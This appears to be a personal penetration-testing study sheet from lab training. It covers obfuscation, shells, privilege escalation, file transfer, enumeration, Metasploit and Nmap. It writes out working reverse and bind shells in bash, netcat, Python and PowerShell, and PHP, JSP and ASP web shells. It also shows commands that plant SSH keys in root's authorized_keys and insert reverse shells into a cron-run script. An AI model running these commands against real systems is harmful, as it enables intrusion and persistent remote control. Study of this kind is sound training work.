# Hacking Notes!
- [Hacking Notes!](#hacking-notes)
  - [Javascript obsfucation](#javascript-obsfucation)
  - [Network Requests](#network-requests)
  - [Shell](#shell)
  - [Privilege Escalation](#privilege-escalation)
  - [Transferring Files](#transferring-files)
  - [Web Enumeration](#web-enumeration)
  - [Public Exploits](#public-exploits)
  - [Tools: General](#tools-general)
  - [Tools: Nmap](#tools-nmap)
  - [Pentest Summary](#pentest-summary)
  - [Other](#other)

## Javascript obsfucation

Packing, ciphers, base64/hex/rot encoding

- A packer obfuscation tool usually attempts to convert all words and symbols of the code into a list or a dictionary and then refer to them using the (p,a,c,k,e,d) function to re-build the original code during execution. 
  - The (p,a,c,k,e,d) can be different from one packer to another. 
  - However, it usually contains a certain order in which the words and symbols of the original code were packed to know how to order them during execution.
- `eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5.4(\'3 2 1 0\');',6,6,'Module|Deobfuscation|JavaScript|HTB|log|console'.split('|'),0,{}))`
- [Obsfucator Tool](https://beautifytools.com/javascript-obfuscator.php)
- [A More Advanced Obsfucator Tool](https://obfuscator.io)
- [JSF - Really cool tool](http://www.jsfuck.com/)
- [JJ Encode](https://utf-8.jp/public/jjencode.html)
- [AA Encode](https://utf-8.jp/public/aaencode.html)

- [JSNice - code formatter tool](http://www.jsnice.org/)

- Base 64
  - Encode - `echo https://www.foo.com/ | base64`
  - Decode - `echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d`

- Hex
  - Encode - `echo https://www.foo.com/ | xxd -p`
  - Decode - `echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r`

- Ceaser/Rot13
  - Caesar cipher shifts each letter by a fixed number. E.g. Rot13 shifts letters by 13 places
  - Encode - `echo https://www.foo.com/ |  tr 'A-Za-z' 'N-ZA-Mn-za-m'`
  - Decode - `echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'`

- [Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier)


## Network Requests

- `curl http:/SERVER_IP:PORT/foo.php -X POST -d "payload=value"`

## Shell

- "Getting a shell"
  - This means that the target host has been exploited, and we have obtained shell-level access (typically bash or sh) and can run commands interactively as if we are sitting logged in to the host. A shell may be obtained by exploiting a web application or network/service vulnerability or obtaining credentials and logging into the target host remotely.

| Shell Type | Description |
| ----------- | ----------- |
| Reverse shell | Initiates a connection back to a "listener" on our attack box. |
| Bind shell | "Binds" to a specific port on the target host and waits for a connection from our attack box. |
| Web shell | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command. |

- Netcat
  - Primary usage is for connecting to shells.
  - Furthermore can be used to connect to any listening port and interact with the service running on that port.
  - `netcat 10.10.10.10 22 \n SSH-2.0-OpenSSH_8.4p1 Debian-3` -> here port 22 sent us its banner, stating that SSH is running on it.
    - This is called ==Banner Grabbing==

- We want to compromise a system and exploit a vulnerability to execute commands on the host remotely.
  - To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system's shell, i.e., *Bash* or *PowerShell*, so we can thoroughly investigate the remote system for our next move.
  - Could use *SSH* for linux or *WinRm* for Windows, but we'd need a set of login credentials.

| Shell Type | Method of Communication |
| ----------- | ----------- |
| Reverse shell | Connects back to our system and gives us control through a reverse connection. |
| Bind shell | Waits for us to connect to it and gives us control once we do. |
| Web shell | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |

- Reverse Shell
  - Quick and easy
  - Once we identify a vulnerability on the remote host that allows remote code execution, we can start a netcat listener on our machine that listens on a specific port.
  - `nc -lvnp 1234`
    - `-l` Listen mode, to wait for a connection to connect to us.
    - `-v` Verbose mode
    - `-n` Disable DNS resolution and only connect from/to IPs, to speed up the connection.
    - `-p 1234` Port.
  - Find IP using `ip a` and will be listed under tun0, the same HTB network we connect to through our VPN.
    - FYI normally would connect internet using `eth0`
  
- Reverse Shell command
  - The [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) page has a comprehensive list of reverse shell commands
  - We can utilize the exploit we have over the remote host to execute one of the below commands, i.e., through a Python exploit or a Metasploit module, to get a reverse connection.
  - Reverse Shell can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.
  - Bash:
    - `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
    - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`
      - `nc -lvnp 9443`
  - Powershell:
    - `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

- Bind Shell
  - Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port.
  - The [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) lists Bind Shell commands.
  - Bash:
    - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`
  - Python:
    - `python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
  - Powershell:
    - `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();`
  - `nc 10.10.10.1 1234`
  - Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. 
  - Upgrading TTY
    - Once we connect to a shell through Netcat, we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history.
    - Need to upgrade our TTY.
      - Can be achieved by mapping our terminal TTY with the remote TTY.
      - Could use the *python/stty* method. Run the following from our netcat shell to upgrade our shell to a full tty.
        - `python -c 'import pty; pty.spawn("/bin/bash")'`
      - ctrl+z to background our shell and get back on our local terminal, and input the following stty command:
        - `stty raw -echo`
      - Enter `fg` to bring our netcat shell to the foreground.
      - At this point, the terminal will show a blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
      - Atm shell does not cover the entire terminal.
        - Open another terminal, maximise the window, and then input:
          - `echo $TERM` --> `xterm-256color`
          - `stty size` --> `67 318`
        - Go back to the netcal shell and enter:
          - `export TERM=xterm-256color`
          - `stty rows 67 columns 318`

- Web Shell
  - A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.
  - Want a web shell that would take our command through a GET request, execute it, and print its output back.
    - A web shell script is typically a one-liner that is very short and can be memorized easily
  - php:
    - `<?php system($_REQUEST["cmd"]); ?>`
  - jsp:
    - `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
  - asp:
    - `<% eval request("cmd") %>`
  - Uploading a web shell
    - We need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser.
    - This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.
    - However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. 
    - We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:
      - `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`
    - Once we write our web shell, we can either access it through a browser or by using cURL.
      - `curl http://SERVER_IP:PORT/shell.php?cmd=id`
    - The following are the default webroots for common web servers:
| Web Server | Default Webroot |
| ----------- | ----------- |
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | 	c:\inetpub\wwwroot\ |
| XAMPP | C:\xampp\htdocs\ |

- Web shells continued ...
  - A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using.
  - Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.
  - On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.

## Privilege Escalation
- We want to escalate our privileges to the root user on Linux or the administrator/SYSTEM user on Windows.
  
- PrivEsc Resources
  - [HackTricks](https://book.hacktricks.xyz/)
    - [Linux PrivEsc](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
    - [Windows PrivEsc](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
  - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
    - [Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
    - [Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

- Enumeration Scripts
  - Linux enumeration scripts
    - [LinEnum](https://github.com/rebootuser/LinEnum)
    - [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
  - Windows enumeration scripts
    - [Seatbelt](https://github.com/GhostPack/Seatbelt)
    - [JAWS](https://github.com/411Hall/JAWS)
  - [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/PEASS-ng) is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.
    - `./linpeas.sh` is one such script from PEASS
    - These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. 
    - This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.
- Kernel Exploits
  - Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist.
  - E.g. suppose we find that a system's Linux version to be 3.9.0-73-generic. If we Google exploits for this version or use searchsploit, we would find a CVE-2016-5195, otherwise known as [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs). We can search for and download the DirtyCow exploit and run it on the server to gain root access. 
  - We should keep in mind that kernel exploits can cause system instability, and we should take great care before running them on production systems.
  - It is best to try them in a lab environment and only run them on production systems with explicit approval and coordination with our client.

- Vulnerable Software
  - we can use the `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system.
  - Can then look for public exploits for any installed software.
- User Privileges
  - Common ways to exploit certain user privileges:
    - Sudo
    - SUID
    - Window Token Privileges
  - We can check what sudo privileges we have with the `sudo -l` command.
    - We can use the su command with sudo to switch to the root user `sudo su -`.
    - `sudo -l` -> `(user : user) NOPASSWD: /bin/echo`.
      -  The NOPASSWD entry shows that the /bin/echo command can be executed without a password
      - As it says user, we can run sudo as that user and not as root. To do so, we can specify the user with -u user:
        - `sudo -u user /bin/echo Hello World!`
  - [GTFOBins](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through sudo. 
    - We can search for the application we have sudo privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the sudo privilege we have.
  - [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.

- Scheduled Tasks
  - There are methods to have scripts run at specific intervals to carry out a task. Some examples are having an anti-virus scan running every hour or a backup script that runs every 30 minutes.
    - Usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:
      - 1. Add new scheduled tasks/cron jobs.
      - 2. Trick them to execute a malicious software
  - First check if we are allowed to add new scheduled tasks.
    - In Linux, a common form of maintaining scheduled tasks is through Cron Jobs. There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include: 
      - 1. /etc/crontab
      - 2. /etc/cron.d
      - 3. /var/spool/cron/crontabs/root
    - If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.

- Exposed Credentials
  - Exposed credentials are very common in configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). The enumeration scripts previously discussed look for potential passwords in files and provide them to us, as below:
    - `/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');`
  - We may also check for Password Reuse, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user
    - `su -`
  - We may also use the user credentials to ssh into the server as that user.
- SSH Keys
  - If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it.
    - `vim id_rsa` -> `chmod 600 id_rsa` -> `ssh user@10.10.10.10 -i id_rsa`
      - Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
  - If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file:
    - `ssh-keygen -f key` --> Enter passphrase.
  - This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys:
    - `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`
  - Now, the remote server should allow us to log in as that user by using our private key:
    - `ssh root@10.10.10.10 -i key`

## Transferring Files

- We will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file, we need to learn methods to transfer files with a standard reverse shell.
- Using wget
  - Run a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host. 
  - First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:
  - Then download the file on the remote host that we have code execution on.
  - Note that we used our IP 10.10.14.1 and the port our Python server runs on 8000. If the remote server does not have wget, we can use cURL to download the file (using the -o flag to specify the output file name.)
  - `cd /tmp`
  - `python3 -m http.server 8000`
  - `wget http://10.10.14.1:8000/linenum.sh`
  - `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`
- Using SCP
  - If we have obtained ssh user credentials on the remote host, we can use scp:
  - `scp linenum.sh user@remotehost:/tmp/linenum.sh`
  - Note that we specified the local file name after scp, and the remote directory will be saved to after the :
- Using Base64
  - In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
  - `base64 shell -w 0`
  - Then copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:
  - `echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`
- Validating File Transfers
  - To validate the format of a file, we can run the file command on it.
  - `file shell`
  - When we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run md5sum on it:
  - `md5sum shell`
  - Now, we can go to the remote server and run the same command on the file we transferred. If both files have the same md5 hash, the file was transferred correctly.

## Web Enumeration

- Gobuster
  - Allows for DNS, vhost and directory brute forcing, and other things like enumeration of public AWS S3 buckets
  - dirb common.txt
  - `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`
  - An HTTP status code of 200 reveals that the resource's request was successful,
  - 403 HTTP status code indicates that we are forbidden to access the resource,
  - A 301 status code indicates that we are being redirected, which is not a failure case.
  - Visiting http://10.10.10.121/wordpress in a browser reveals that WordPress is still in setup mode, which will allow us to gain remote code execution (RCE) on the server.
  - There also may be essential resources hosted on subdomains, such as admin panels or applications with additional functionality that could be exploited.
  - --> Use GoBuster to enumerate available subdomains of a given domain using the dns flag to specify DNS mode
  - `git clone https://github.com/danielmiessler/SecLists` -> `sudo apt install seclists -y` -> Next, add a DNS Server such as 1.1.1.1 to the /etc/resolv.conf file -> `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`
- Banner Grabbing / Web Server Headers
  - Gives a good picture of what's hosted on a web server; they can reveal the specific application framework in use, the authentication options, and whether the server is missing essential security options or has been misconfigured.
  - `curl -IL https://www.inlanefreight.com`
  - Another handy tool is [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness), which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

- Whatweb 
  - We can extract the version of web servers, supporting frameworks, and applications using the command-line tool whatweb
  - `whatweb 10.10.10.121`
  - `whatweb --no-errors 10.10.10.0/24`

- Certificates
  - SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use. 

- Robots.txt
  - It is common for websites to contain a robots.txt file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing.
  - The robots.txt file can provide valuable information such as the location of private files and admin pages
  - `User-agent: *\nDisallow: /private`

- Source code
  - We can hit [CTRL + U] to bring up the source code window in a browser

  
## Public Exploits

- Google
- Searchsploit can be used to search for public vulnerabilities/exploits for any application
  - `sudo apt install exploitdb -y` -> e.g. `searchsploit openssh 7.2`
- Online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/). 
  

- Metasploit
  - Metasploit Framework (MSF) contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets:
  - Running reconnaissance scripts to enumerate remote hosts and compromised targets.
  - Verification scripts to test the existence of a vulnerability without actually compromising the target.
  - Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets.
  - Many post-exploitation and pivoting tools.
  - `msfconsole`
  - `> search exploit eternalblue`
  - `> search cve:2009 type:exploit`
  - `> use exploit/windows/smb/ms17_010_psexec`
  - `> show options` displays the options available to configure. Any option with "Required" set to yes needs to be set for the exploit to work.
  - `> set RHOSTS 10.10.10.40`
  - `> set LHOST tun0`
  - Run `> check` to ensure the server is vulnerable:
  - Execute `> run` or `> exploit` to run the exploit.
  - Retired HackTheBox machines great for practising metasploit: Granny/Grandpa, Jerry, Blue, Lame, Optimum, Legacy, Devel

## Tools: General

- Burpsuite
- FoxyProxy
  - Browser extension that when configured, routes traffic through Burpsuite proxy
- tmux
  - [Tmux Cheat Sheet](https://tmuxcheatsheet.com/)
- vim
  - [Vim Cheat Sheet](https://vimsheet.com/)
  - 
| Command | Description |
| ----------- | ----------- |
| x | Cut character |
| dw | Cut word |
| dd | Cut full line |
| yw | Copy word |
| yy | Copy full line |
| p | Paste |
| x | Cut character |
| :1 | Go to line number 1 |
| :w | Write the file, save |
| :q | Quit |
| :q! | Quit without saving |
| wq | Write and quit |
- ftp
  - FTP supports common commands such as cd and ls and allows us to download files using the get command
  - `ftp -p 10.129.42.253`
  - Supports common commands such as `cd` and `ls` and allows us to download files using the `get` command.
  
- SMB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement.
  - Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as [EternalBlue](https://www.avast.com/c-eternalblue).
  - Nmap has many scripts for enumerating SMB, such as [smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html), which will interact with the SMB service to extract the reported operating system version
  - *SMB allows users and administrators to share folders and make them accessible remotely by other users.*
  - A tool that can enumerate and interact with SMB shares is smbclient. 
  - The -L flag specifies that we want to retrieve a list of available shares on the remote host, while -N suppresses the password prompt.
  - `smbclient -N -L \\\\10.129.42.253`
  - 

- SNMP (Simple Network Management Protocol) is a networking protocol used for the management and monitoring of network-connected devices in Internet Protocol network.
  - The SNMP protocol is embedded in multiple local devices such as routers, switches, servers, firewalls, and wireless access points accessible using their IP address.
  - *SNMP provides a common mechanism for network devices to relay management information within single and multi-vendor LAN or WAN environments.*
  - It is an application layer protocol in the OSI model framework.
  - SNMP Community strings provide information and statistics about a router or device, helping us gain access to it.
  - The manufacturer default community strings of public and private are often unchanged. 
  -  In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. 
  - `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`

- A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool.
  - `snmpwalk -v 2c -c private  10.129.42.253`
  - `onesixtyone -c dict.txt 10.129.42.254`

-  It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) using a wordlist generated by crawling their website using a tool such as [CeWL](https://github.com/digininja/CeWL).

## Tools: Nmap

- Service Scanner.
- Port numbers range from 1 to 65,535, with the range of well-known ports 1 to 1,023 being reserved for privileged services. 
  - Port 0 is a reserved port in TCP/IP networking and is not used in TCP or UDP messages. 
  - If anything attempts to bind to port 0 (such as a service), it will bind to the next available port above port 1,024 because port 0 is treated as a "wild card" port.
  - Port 3389 is the default port for Remote Desktop Services and is an excellent indication that the target is a Windows machine
  - Nmap output - "states" - sometimes we will see other ports listed that have a different state, such as **filtered**. This can happen if a firewall is only allowing access to the ports from specific addresses.
  - Port 22 (SSH) being available indicates that the target is running Linux/Unix, but this service can also be configured on Windows. 

- The web page title PHP 7.4.3 - phpinfo() indicates that this is a PHPInfo file, which is often manually created to confirm that PHP has been successfully installed.

- Use the -sC parameter to specify that Nmap scripts should be used to try and obtain more detailed information.
  - This flag uses the default scripts, which are listed [here](https://nmap.org/nsedoc/categories/default.html).
- The -sV parameter instructs Nmap to perform a version scan.
  - Service scan.
  - The version scan is underpinned by a comprehensive database of over 1,000 service signatures
- -p- tells Nmap that we want to scan all 65,535 TCP ports.
- -Pn ignores waiting for a ping back from the host and just search for services anyway.
- --open only returns open ports.
- -oG - output the greppable format to stdout
  - `nmap -v -oG -`
- -oA outputs all scan formats.
  - This includes XML output, greppable output, and text output that may be useful to us later. It is essential to get in the habit of taking extensive notes and saving all console output early on.
- --script=http-enum
  - [http-enum script](https://nmap.org/nsedoc/scripts/http-enum.html) can be used to enumerate common web application directories

- `locate scripts/citrix` 
  - List various available nmap scripts

- `nmap -v -oG -`
- `nmap -sV --open -oA nibbles_initial_scan <ip address>`
  - nibbles_initial_scan is the name of the output file.

- Ideas
  - `nc -nv 10.129.42.190 80`
  - `nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190`
  - `nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190` 

- We could use [this](https://raw.githubusercontent.com/cyberstruggle/DeltaGroup/master/CVE-2019-19781/CVE-2019-19781.nse) Nmap script to audit for the severe Citrix NetScaler vulnerability ([CVE-2019–19781](https://www.rapid7.com/blog/post/2020/01/17/active-exploitation-of-citrix-netscaler-cve-2019-19781-what-you-need-to-know/)), while Nmap also has other scripts to audit a Citrix installation.
- `nmap --script <script name> -p<port> <host>`
- Banner grabbing - `nmap -sV --script=banner <target>`
  - `nmap -sV --script=banner -p21 10.10.10.0/24`
  - `nc -nv 10.129.42.253 21` a nc (netcat) equivalent. "-v" gives more verbose output and "-n" switches off any DNS or service lookups on any specified addresses, hostnames or ports.

## Pentest Summary

Remember that enumeration is an iterative process. After performing our Nmap port scans, make sure to perform detailed enumeration against all open ports based on what is running on the discovered ports. Follow the same process as we did with Nibbles:

- Enumeration/Scanning with Nmap 
  - Perform a quick scan for open ports followed by a full port scan

- Web Footprinting 
  - Check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include whatweb and Gobuster

- If you identify the website URL, you can add it to your '/etc/hosts' file with the IP you get in the question below to load it normally, though this is unnecessary.

- After identifying the technologies in use, use a tool such as Searchsploit to find public exploits or search on Google for manual exploitation techniques

- After gaining an initial foothold, use the Python3 pty trick to upgrade to a pseudo TTY

- Perform manual and automated enumeration of the file system, looking for misconfigurations, services with known vulnerabilities, and sensitive data in cleartext such as credentials

- Organize this data offline to determine the various ways to escalate privileges to root on this target

- There are two ways to gain a foothold—one using Metasploit and one via a manual process. Challenge ourselves to work through and gain an understanding of both methods.

- There are two ways to escalate privileges to root on the target after obtaining a foothold. Make use of helper scripts such as LinEnum and LinPEAS to assist you. Filter through the information searching for two well-known privilege escalation techniques. 


## Other

- `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.25 12808 >/tmp/f"); ?>`
- `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.25 12809 >/tmp/f' | tee -a monitor.sh`

| Syntax | Description |
| ----------- | ----------- |
| Header | Title |
| Paragraph | Text |band
